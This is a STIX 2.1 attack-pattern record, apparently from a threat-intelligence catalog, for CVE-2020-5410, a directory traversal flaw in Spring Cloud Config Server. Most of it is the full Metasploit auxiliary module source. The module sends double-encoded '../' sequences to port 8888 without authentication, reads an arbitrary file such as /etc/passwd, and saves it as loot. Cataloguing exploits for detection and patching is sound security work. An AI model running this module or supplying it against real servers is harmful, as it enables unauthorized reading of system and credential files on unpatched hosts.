{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1166f8fd-e2ce-4d93-8ab0-9a4f02174b78",
    "created": "2024-08-14T16:28:55.458273Z",
    "modified": "2024-08-14T16:28:55.458277Z",
    "name": "Directory Traversal in Spring Cloud Config Server",
    "description": " This module exploits an unauthenticated directory traversal vulnerability which exists in Spring Cloud Config versions 2.2.x prior to 2.2.3 and 2.1.x prior to 2.1.9, and older unsupported versions. Spring Cloud Config listens by default on port 8888.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/springcloud_directory_traversal.rb",
            "external_id": "springcloud_directory_traversal.rb"
        },
        {
            "source_name": "reference",
            "url": "https://tanzu.vmware.com/security/cve-2020-5410"
        },
        {
            "source_name": "reference",
            "url": "https://xz.aliyun.com/t/7877"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Directory Traversal in Spring Cloud Config Server',\n        'Description' => %q{\n          This module exploits an unauthenticated directory traversal vulnerability\n          which exists in Spring Cloud Config versions 2.2.x prior to 2.2.3 and\n          2.1.x prior to 2.1.9, and older unsupported versions. Spring\n          Cloud Config listens by default on port 8888.\n        },\n        'References' => [\n          ['CVE', '2020-5410'],\n          ['URL', 'https://tanzu.vmware.com/security/cve-2020-5410'],\n          ['URL', 'https://xz.aliyun.com/t/7877']\n        ],\n        'Author' => [\n          'Fei Lu', # Vulnerability discovery\n          'bfpiaoran@qq.com', # Vulnerability discovery\n          'Dhiraj Mishra' # Metasploit module\n        ],\n        'DisclosureDate' => '2020-06-01',\n        'License' => MSF_LICENSE,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8888),\n        OptString.new('TARGETURI', [true, 'The base path to Spring Cloud Config installation', '/']),\n        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),\n        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 11 ])\n      ]\n    )\n  end\n\n  def run_host(ip)\n    traversal = '../' * datastore['DEPTH']\n    traversal = \"#{traversal}#{datastore['FILEPATH']}\"\n    traversal = traversal.gsub('/', '%252F')\n    traversal << '%23foo/development'\n    trav_uri = normalize_uri(target_uri.path, traversal)\n\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri' => trav_uri\n    })\n\n    unless res && res.code == 200\n      print_error('Nothing was downloaded')\n      return\n    end\n\n    print_good(\"#{peer} - Downloaded #{res.body.length} bytes\")\n    path = store_loot(\n      'springcloud.traversal',\n      'text/plain',\n      ip,\n      res.body\n    )\n    print_good(\"File saved in: #{path}\")\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-06-01"
}